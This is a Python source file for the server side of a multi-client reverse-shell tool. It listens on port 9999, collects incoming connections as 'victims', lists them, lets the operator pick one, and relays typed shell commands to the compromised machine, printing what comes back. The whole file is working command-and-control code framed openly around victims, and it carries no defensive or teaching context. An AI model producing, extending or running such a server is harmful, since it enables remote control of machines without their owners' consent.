import  socket
import os
import sys
import threading
import time
from queue import Queue


num_thread = 2
job_num = [1,2]
queue = Queue()

connected_victims_obj  , address_list = [] , []



def create_socket():
    try:
        global host , port , s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print('Socket creating error...',str(msg))


                ########### Binding and listening to connections ###########

def bind_socket():
    try:
        global host , port , s
        # print('host : ',host,'port :',port)
        # print('Binding to the port : ',str(port))

        s.bind((host,port))
        s.listen(5)

    except socket.error as msg:
        print('Error binding socket to port \n Retrying the connection.....',end='\r')
        bind_socket()

                ########### establishing the connection with multiple client ###########

def accepting_connection():
    for c in connected_victims_obj:
        c.close()

    # del connected_victims_obj[:]
    # del address_list[:]

    while True:
        try:
        # if True:
            conn , address = s.accept()
            s.setblocking(1)  # to prevent time out for idle connections

            connected_victims_obj.append([conn])
            address_list.append(address)

            print('connected with ',address[0])

            # print(address)
            # print('************************************************')
            # print(connected_victims_obj)
        except:
        # else:
            print('Error in connection')


                ########### creating own custom shell for search and connect ###########

def own_cmd_prompt():
    while True:
        if len(connected_victims_obj)>=1:
            cmd = input('own_cmd > ')
            if cmd == 'list':
                list_online_victim()
            elif 'select' in cmd:
                conn_with_target = get_target_victim(cmd)
                if conn_with_target is not None:
                    send_cmd_to_target(conn_with_target)
            elif cmd=='quit':
                # conn_obj.close()
                s.close()
                print('Connection Interrupted')         # error error error error error error error error 
                sys.exit()
            else:
                print('Invalid command')
        else:
            print('Waiting for connections....',end='\r')


                ########### list all the victims who are online at the same time ###########

def list_online_victim():
    # result = []
    result = ''

    for id,conn in enumerate(connected_victims_obj):
        try:
            print(conn[0])
            conn[0].send(str.encode('online'))
            conn[0].recv(20480)
        except:
            continue
        # result.append(str(address_list[i]))
        
        result += str(id) + "   address :  " + str(address_list[id][0]) + "   port :   " + str(address_list[id][1]) + '\n'
    
    print( '        *--------victims--------- \n\n' , result )


                ########### select your target victim from all online victims ###########

def get_target_victim(cmd):
    try:
    # if True:
        # target_address = cmd.replace( 'select ', '')
        target_id = int(cmd.replace('select ', ''))
        print(connected_victims_obj[target_id][0])
        conn_obj_of_target = connected_victims_obj[target_id][0]
        print('Connecteds to : ',str(address_list[target_id][0]))
        print(str(address_list[target_id][0]) + ' >  ' , end='')
        return conn_obj_of_target
    except:
    # else:
        print('Target is offline or not in your victims list')
        return None

                ########### send commands to connected target  victim ###########

def send_cmd_to_target(conn_obj):
    while True:
        try:
            cmd = input('Victim : ')
            if cmd == 'quit':
                break

            if len(str.encode(cmd))>0:
                conn_obj.send(str.encode(cmd))
                victim_response = str(conn_obj.recv(20480),'utf8')

                print(victim_response,end='')
        except:
            print('Error in command sending',end='\r')
            break

                ########### Threading 1 : connection handeling 2 : send commands ###########

def create_thread():
    for i in range(num_thread):
        t = threading.Thread(target=work)
        t.daemon = True # for memory free after execution
        t.start()

def create_job():
    for x in job_num:
        queue.put(x)
    queue.join()

def work():
    while True:
        x = queue.get()
        if x == 1:      # first thread define
            create_socket()
            bind_socket()
            accepting_connection()
        if x==2:        # second thread define
            own_cmd_prompt()
        queue.task_done()


create_thread()
create_job()